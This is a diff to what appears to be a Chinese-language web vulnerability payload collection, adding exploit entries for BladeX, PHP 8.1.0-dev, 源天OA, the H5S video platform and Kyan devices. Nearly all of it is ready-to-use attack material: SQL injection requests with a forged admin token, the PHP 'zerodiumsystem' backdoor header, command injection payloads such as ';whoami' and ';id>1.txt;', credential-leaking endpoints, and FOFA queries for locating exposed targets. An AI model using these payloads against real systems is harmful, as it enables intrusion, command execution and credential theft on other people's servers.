@@ -1422,10 +1422,12 @@ User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like 
 /api/blade-system/dict-biz/list
 /api/blade-system/menu/menu-list
 /api/blade-develop/datasource/list
+/api/blade-develop/code/list
 /api/blade-log/usual/list
 /api/blade-user/export-user
 /api/blade-user/user-list
 /api/blade-log/error/lis
+/api/blade-log/api/list
 
 # fofa：body="https://bladex.vip"
 GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
@@ -1434,3 +1436,57 @@ User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/2010010
 Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJ1c2VyX25hbWUiOiJhZG1pbiIsInJlYWxfbmFtZSI6IueuoeeQhuWRmCIsImF1dGhvcml0aWVzIjpbImFkbWluaXN0cmF0b3IiXSwiY2xpZW50X2lkIjoic2FiZXIiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwibGljZW5zZSI6InBvd2VyZWQgYnkgYmxhZGV4IiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwic2NvcGUiOlsiYWxsIl0sIm5pY2tfbmFtZSI6IueuoeeQhuWRmCIsIm9hdXRoX2lkIjoiIiwiZGV0YWlsIjp7InR5cGUiOiJ3ZWIifSwiYWNjb3VudCI6ImFkbWluIn0.RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ
 Connection: close
 ```
+
+## PHP 8.1.0-dev RCE & SQLi
+```
+User-Agentt: zerodiumsleep(5);
+User-Agentt: zerodiumsystem('id');
+```
+
+## 源天OA GetDataAction SQL注入漏洞
+```
+# fofa：body="/vmain/login.jsp"
+/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a
+```
+
+https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/f4596359a8b7b31ae4d231eeaec711706b892ed2/docs/wiki/oa/%E6%BA%90%E5%A4%A9OA/%E6%BA%90%E5%A4%A9OA%20GetDataAction%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+
+## 零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞 CNVD-2020-67113
+```
+# fofa：title="H5S视频平台|WEB"
+# API文档可以未授权访问
+/doc/api.html
+
+# 存在用户账号密码泄漏的接口
+/api/v1/GetUserInfo?user=admin&session=
+
+# 其中登录接口中 Password为接口中存在的账号密码，可以直接发送请求获取Cookie
+/api/v1/Login?user=admin&password=827ccb0eea8a706c4c34a16891f84e7b
+
+# 请求成功后访问主页面
+```
+
+## Kyan多个漏洞
+
+```
+# fofa：title=="platform - Login" || "login_files/button_login_to_bluesky.png"
+# 密码泄露
+/hosts
+
+# time.php命令执行
+POST /time.php HTTP/1.1
+
+timesynctype=;whoami
+
+# module.php命令执行
+/module.php?cmd=delete&name=;whoami
+# 命令执行结果/1.txt
+/module.php?cmd=delete&name=;id>1.txt;
+
+# license.php命令执行
+/license.php?cmd=delete&name=;whoami
+
+# run.php命令执行。
+# 直接访问run.php界面执行命令。
+```
+
